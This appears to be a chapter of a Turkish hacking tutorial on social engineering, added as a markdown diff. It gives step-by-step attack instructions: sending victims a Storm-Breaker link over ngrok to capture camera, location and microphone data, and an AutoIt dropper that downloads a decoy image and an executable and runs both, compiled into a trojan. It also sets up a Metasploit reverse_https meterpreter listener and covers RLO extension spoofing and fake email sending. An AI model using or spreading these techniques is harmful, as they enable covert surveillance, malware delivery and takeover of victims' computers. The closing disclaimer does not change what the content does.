@@ -1,0 +1,139 @@
+# 📚 Bölüm 13: Sosyal Mühendislik
+
+---
+
+## 🌐 Sadece Link ile Cihazlara Ulaşmak
+
+### 🔸 Ngrok Nedir?
+
+Ngrok, yerel (localhost) servislerini dış dünyaya açmak için kullanılan bir tünelleme (tunneling) aracıdır.
+
+- HTTPS, TCP ve UDP tünelleri oluşturabilir.
+- Port yönlendirme olmadan dış IP veya domain üzerinden erişim sağlar.
+
+```bash
+# HTTP 2525 portunu tünellemek
+./ngrok http 2525
+```
+
+### 🚨 Storm-Breaker Kullanımı
+
+```bash
+python3 st.py
+```
+
+- Ngrok iki bağlantı adresi verir: biri local, biri internete açık URL.
+- Kurbana bu link gönderilerek **kamera, konum, mikrofon** verileri ele geçirilebilir.
+- Premium sürüm ile uyarı ekranları kaldırılabilir.
+
+---
+
+## 🦠 Zararlı Yazılım Türleri
+
+1. **Virüs** – Dosyalara bulaşan ve çoğalan zararlı yazılım
+2. **Worm (Solucan)** – Ağa yayılan, çoğalan yazılım
+3. **Trojan (Truva Atı)** – Masum görünen ama arka planda zararlı çalışan yazılım
+4. **Ransomware** – Dosyaları şifreleyip fidye talep eden yazılım
+5. **Spyware** – Bilgi toplayan casus yazılım
+6. **Adware** – İstenmeyen reklamlar gösteren yazılım
+7. **Rootkit** – Kalıcı erişim sağlayan araç
+8. **Keylogger** – Klavye vuruşlarını kaydeden yazılım
+9. **Botnet** – Enfekte sistemlerden oluşan kötü amaçlı ağ
+
+---
+
+## 🔍 Bilgi Toplama Araçları
+
+### 🕵️ Maltego
+
+- Açık kaynak istihbarat (OSINT) ve link analizi yapar.
+- Kişi, e-posta, alan adı, IP vs. analiz edilir.
+- Görsel grafiklerle ilişki çıkarımı sağlar.
+
+### 🔎 Sherlock
+
+- Kullanıcı adı üzerinden sosyal medya hesaplarını arar.
+
+```bash
+python3 sherlock username
+python3 sherlock username --output output.txt
+python3 sherlock username --site Instagram
+```
+
+---
+
+## 🖼 Görsel ve Backdoor Birleştirmek
+
+1. `.jpg`, `.ico` ve `backdoor.exe` dosyaları `/var/www/html/backdoor` içine atılır.
+2. Windows'a aktarıldıktan sonra AutoIt ile birleştirilir.
+
+### 📄 AutoIt Script:
+
+```autoit
+#include <StaticConstants.au3>
+#include <WindowsConstants.au3>
+
+Local $urls = "http://192.168.64.2/backdoor/android.jpg,http://192.168.64.2/backdoor/myhttps.exe"
+Local $urlsArray = StringSplit($urls, ",", 2)
+
+For $url In $urlsArray
+    $sFile = _DownloadFile($url)
+    shellExecute($sFile)
+Next
+
+Func _DownloadFile($sURL)
+    Local $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    Local $sDirectory = @TempDir & "\" & $sFile
+    Local $hDownload = InetGet($sURL, $sDirectory, 17, 1)
+    InetClose($hDownload)
+    Return $sDirectory
+EndFunc
+```
+
+3. AutoIt ile `Compile Script to EXE` özelliği kullanılarak trojan hazırlanır.
+
+---
+
+## 🧪 Trojanı Çalıştırmak
+
+1. **Dinleyici Başlatmak**:
+
+```bash
+msfconsole
+use/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 192.168.1.5
+set LPORT 443
+exploit -j -z
+```
+
+2. Hedef kullanıcı trojan'ı çalıştırdığında:
+
+```bash
+sessions -l      # Tüm oturumları listeler
+sessions -i 1    # 1 numaralı session'a bağlan
+```
+
+3. Meterpreter içinden:
+
+```bash
+ls
+background
+```
+
+---
+
+## 🎭 Uzantı Gizleme (Right-to-Left Override)
+
+- `unicode-explorer.com` üzerinden RLO karakteri (U+202E) ile dosya uzantısı gizlenebilir.
+
+---
+
+## 📧 E-posta Sahteciliği
+
+- `anonymous email sender` gibi web siteleri üzerinden fake mail gönderimi yapılabilir.
+
+---
+
+⚠️ **Uyarı:** Bu dokümandaki bilgiler yalnızca yasal ve eğitim amaçlı kullanılmalıdır. İzinsiz kullanımlar yasa dışıdır.
+
